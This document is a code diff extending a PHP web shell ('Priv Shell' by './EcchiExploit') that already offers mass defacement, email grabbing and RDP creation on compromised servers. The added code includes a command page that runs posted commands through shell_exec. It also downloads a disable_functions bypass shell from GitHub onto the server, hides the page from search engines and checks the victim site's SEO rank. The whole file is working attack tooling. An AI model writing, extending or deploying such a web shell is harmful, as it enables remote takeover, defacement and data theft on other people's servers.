@@ -1,4 +1,7 @@
 <?php
+header('User-Agent:' . randomagent());
+header("X-XSS-Protection: 0");
+
 define('version', '1.0');
 define('author', './EcchiExploit');
 
@@ -43,6 +46,53 @@ function r($dir, $perm)
    } else {
       return "<p class='text-warning'>" . $perm . "</p>";
    }
+}
+
+function randomagent()
+{
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+   $useragent[] = 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+   ';
+
+   $getuseragent = array_rand($useragent);
+   return $useragent[$getuseragent];
 }
 
 function massdeface($dir, $file, $filename, $type = null)
@@ -151,6 +201,20 @@ function getexist()
    return $disable;
 }
 
+function seorank($url)
+{
+   $setopt = array(
+      CURLOPT_URL => 'https://www.checkmoz.com/bulktool',
+      CURLOPT_RETURNTRANSFER => true,
+      CURLOPT_POST => true,
+      CURLOPT_POSTFIELDS => "getStatus=1&siteID=1&sitelink=$url&da=1&pa=1&alexa=1"
+   );
+   $ch = curl_init();
+   curl_setopt_array($ch, $setopt);
+   return curl_exec($ch);
+   curl_close($ch);
+}
+
 function getact($dir, $file, $label)
 {
 ?>
@@ -167,6 +231,7 @@ function getact($dir, $file, $label)
 
 function shell()
 {
+
    if (isset($_GET['dir'])) {
       $dir = htmlspecialchars($_GET['dir']);
       chdir($dir);
@@ -178,9 +243,12 @@ function shell()
    $scdir = explode("/", $dir);
    $scandir = scandir($dir);
    $disable = @ini_get('disable_functions');
-   $disable = (!empty($disable)) ? $disable : 'NONE';
+   $disable = (!empty($disable)) ? "<font class='text-warning'>$disable</font>" : '<font class="text-dark">NONE</font>';
    $os = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
    $checkrdp = ($os !== 'Windows' && getexist() !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
+   $rank = seorank($_SERVER['SERVER_NAME']);
+   $getrank = preg_match_all('/(.*?)<\/td>/', $rank, $get);
+   $check = preg_replace('/<td>/', '', $get[1]);
 ?>
    <!DOCTYPE html>
    <html lang="en">
@@ -192,6 +260,7 @@ function shell()
       <meta name="keywords" content="<?= author ?>">
       <meta name="author" content="<?= author ?>">
       <meta name="description" content="Priv Shell">
+      <meta name="robots" content="noindex, nofollow">
       <link rel="icon" href="https://1.bp.blogspot.com/-Q4FzNb_oemU/XZ_a4WzmgNI/AAAAAAAAAZg/udnrGlkAkV0NYh-rDTC-VB64rimuu5VtQCK4BGAYYCw/s1600/IMG-20190901-WA0263.jpg" type="image/png">
       <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
@@ -265,18 +334,29 @@ function shell()
                            Email Grabber
                         </a>
                      </p>
+                     <p>
+                        <a class="btn btn-outline-info text-white" href="<?= "?dir=$dir&opt=cmd" ?>">
+                           <i class="fad fa-terminal"></i>
+                           Command Shell
+                        </a>
+                     </p>
                   </div>
                </div>
                <div class="collapse multi-collapse p-3" id="info">
                   <div class="card card-body">
                      <div class="font-weight-bold text-info">
-                        <p>Shell Version : <span class="text-dark"><?= version ?></p>
-                        <p>OS : <span class="text-dark"><?= $os ?></p>
-                        <p>RDP : <span class="text-dark"><?= $checkrdp ?></p>
-                        <p>PHP Version : <span class="text-dark"><?= PHP_VERSION ?></p>
-                        <p>Software : <span class="text-dark"><?= $_SERVER['SERVER_SOFTWARE'] ?></p>
-                        <p>Information System : <span class="text-dark"><?= php_uname() ?></p>
-                        <p>Disable Function : <span class="text-dark text-wrap"><?= $disable ?></span></p>
+                        <p>Shell Version : <span class="text-dark"><?= version ?></span></p>
+                        <p>
+                           Rank Alexa : <span class="text-dark"><?= $check[4] ?></span>
+                           DA : <span class="text-dark"><?= $check[2] ?></span>
+                           PA : <span class="text-dark"><?= $check[3] ?></span>
+                        </p>
+                        <p>OS : <span class="text-dark"><?= $os ?></span></p>
+                        <p>RDP : <span class="text-dark"><?= $checkrdp ?></span></p>
+                        <p>PHP Version : <span class="text-dark"><?= PHP_VERSION ?></span></p>
+                        <p>Software : <span class="text-dark"><?= $_SERVER['SERVER_SOFTWARE'] ?></span></p>
+                        <p>Information System : <span class="text-dark"><?= php_uname() ?></span></p>
+                        <p>Disable Function : <span class="text-wrap"><?= $disable ?></span></p>
                      </div>
                   </div>
                </div>
@@ -425,7 +505,7 @@ function shell()
                                  <div class="input-group-prepend">
                                     <label class="input-group-text" for="host">Hostname</label>
                                  </div>
-                                 <input type="text" class="form-control" id="host" name="hostname" placeholder="hostname">
+                                 <input type="text" class="form-control" id="host" name="hostname" placeholder="hostname" required>
                               </div>
                            </div>
                         </div>
@@ -435,7 +515,7 @@ function shell()
                                  <div class="input-group-prepend">
                                     <label class="input-group-text" for="user">Username</label>
                                  </div>
-                                 <input type="text" class="form-control" id="user" name="user" placeholder="username">
+                                 <input type="text" class="form-control" id="user" name="user" placeholder="username" required>
                               </div>
                            </div>
                         </div>
@@ -500,6 +580,59 @@ function shell()
                         }
                         ?>
                      </div>
+                  </div>
+               </div>
+            </div>
+         <?php
+         } else if ($_GET['opt'] == 'cmd') {
+         ?>
+            <div class="row justify-content-center p-2">
+               <div class="md-0">
+                  <div class="card card-body">
+                     <form method="POST">
+                        <div class="mb-3">
+                           <div class="form-group">
+                              <div class="input-group is-invalid">
+                                 <div class="input-group-prepend">
+                                    <label class="input-group-text" for="cmd">Command</label>
+                                 </div>
+                                 <input type="text" class="form-control" id="cmd" name="command" placeholder="Your Command" value="uname -a">
+                              </div>
+                           </div>
+                        </div>
+                        <div class="form-group">
+                           <button type="submit" class="btn btn-info form-control">Submit</button>
+                        </div>
+                     </form>
+                     <?php
+                     if (isset($_POST['command'])) {
+                        $cmd = htmlspecialchars($_POST['command']);
+                        if (getexist() == 'Disable') {
+                           mkdir('bypass-disable');
+                           $file = fopen('bypass-disable/bypass.php', 'w');
+                           fwrite($file, file_get_contents('https://raw.githubusercontent.com/l3m0n/Bypass_Disable_functions_Shell/master/shell.php'));
+                           fclose($file);
+
+                           echo '
+                           <label class="text-info" for="result">Result Disable And To Bypass Disable Function :</label>
+                           <div class="embed-responsive embed-responsive-16by9 form-group">
+                              <iframe id="result" class="form-control embed-responsive-item" src="bypass-disable/bypass.php"></iframe>
+                           </div>
+                           ';
+                        } else {
+                     ?>
+                           <div class="mb-3">
+                              <div class="input-group is-invalid">
+                                 <div class="input-group-prepend">
+                                    <label class="input-group-text" for="filname">Result</label>
+                                 </div>
+                                 <textarea class="form-control text-dark font-weight-bold" rows="5"><?= shell_exec($cmd) ?></textarea>
+                              </div>
+                           </div>
+                     <?php
+                        }
+                     }
+                     ?>
                   </div>
                </div>
             </div>
